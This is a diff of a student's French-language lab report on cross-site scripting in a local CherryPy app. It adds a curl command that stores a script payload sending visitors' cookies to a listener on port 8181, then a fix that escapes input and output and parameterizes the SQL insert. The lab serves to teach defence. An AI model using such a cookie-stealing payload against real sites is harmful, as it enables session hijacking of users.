@@ -2,7 +2,7 @@
 
 ## Binome
 
-Nom, Prénom, email: ___
+AMEVIGBE Yao Isidore
 Nom, Prénom, email: ___
 
 
@@ -119,11 +119,40 @@ $ curl -X POST  -d "chaine=<script>alert(\"hello\")</script>"  http://localhost:
 ```
 
 * Commande curl pour lire les cookies
+```sh 
+$ curl -X POST  -d "chaine=<script>document.location=\"http://localhost:8181?chaine=\".concat(document.cookie)</script>"  http://localhost:8080/
+```
 
-
+Pour récupérer les cookies il suffit de lancer la commande curl vers un serveur sur le port 8181. On peut même evaluer le cookie et lui passer cela en paramètre.
 ## Question 6
 
 Rendre un fichier server_xss.py avec la correction de la
 faille. Expliquez la demarche que vous avez suivi.
 
+Implémentation
+==============
 
+Pour eviter les failles **xss** il echapper les données lors de l'insertions et lors de l'affichage. 
+Lors de l'affichage car c'est en ce moment que les données sont exécutés par le navigateur et ainsi eviter que ces données soient transmises aux malveillants. 
+
+Pour l'insertion un code javascript peut eventuellement exécuter des codes malveillants nottament pour supprimer des données dans la BDD en réalisant des requêtes.
+
+```py 
+    def index(self, **post):
+        cherrypy.response.cookie["ExempleCookie"] = "Valeur du cookie"
+        cursor = self.conn.cursor()
+        if cherrypy.request.method == "POST":
+            requete = "INSERT INTO chaines (txt,who) VALUES(%s,%s)"
+            values = (escape(post["chaine"]), cherrypy.request.remote.ip)
+            print("req: [" + requete + "]")
+            cursor.execute(requete, values)
+            self.conn.commit()
+
+        chaines = []
+        cursor.execute("SELECT txt,who FROM chaines");
+        for row in cursor.fetchall():
+            chaines.append(escape(row[0]) + " envoye par: " + row[1])
+
+        cursor.close()
+        return '''
+```
